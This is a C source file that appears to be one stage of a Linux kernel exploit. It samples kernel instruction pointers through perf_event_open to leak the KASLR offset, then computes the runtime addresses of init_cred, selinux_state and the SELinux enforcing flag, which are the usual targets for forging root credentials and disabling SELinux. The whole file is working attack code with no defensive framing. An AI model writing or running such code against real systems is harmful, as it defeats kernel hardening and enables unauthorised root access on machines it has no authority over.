#include "kaslr.h"
#include "common.h"
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <stdio.h>

static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

uint64_t detect_kaslr(uint64_t *init_cred_out, uint64_t *selinux_state_out, uint64_t *enforcing_out) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) { printf("  perf_open: errno=%d\n", errno); return 0; }

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;

    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_kernel_ip = 0;
    int n_ips = 0;

    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            n_ips++;
            uint64_t ip = *(uint64_t *)(hdr + 1);
            if (first_kernel_ip == 0) first_kernel_ip = ip;
            if (n_ips <= 3) printf("    IP[%d]=0x%lX\n", n_ips, (unsigned long)ip);
        }
        tail += hdr->size;
    }

    munmap(buf, mmap_size); close(fd);
    printf("    kernel_samples=%d\n", n_ips);

    if (n_ips == 0 || first_kernel_ip == 0) { printf("  perf: no kernel IPs\n"); return 0; }

    int64_t kaslr;
    if (first_kernel_ip >= VMLINUX_TEXT) {
        kaslr = (int64_t)((first_kernel_ip - VMLINUX_TEXT) & ~0x1FFFFFULL);
    } else {
        kaslr = -(int64_t)((VMLINUX_TEXT - first_kernel_ip) & ~0x1FFFFFULL);
    }

    *init_cred_out = (uint64_t)((int64_t)VMLINUX_INIT_CRED + kaslr);
    *selinux_state_out = (uint64_t)((int64_t)VMLINUX_SELINUX_STATE + kaslr);
    *enforcing_out = (uint64_t)((int64_t)VMLINUX_SELINUX_ENFORCING_BOOT + kaslr);

    printf("    kaslr=%ld (0x%lX)\n", kaslr, (unsigned long)kaslr);
    printf("    init_cred=0x%lX\n", (unsigned long)*init_cred_out);
    printf("    selinux_state=0x%lX\n", (unsigned long)*selinux_state_out);
    printf("    enforcing_boot=0x%lX\n", (unsigned long)*enforcing_out);
    return (uint64_t)kaslr;
}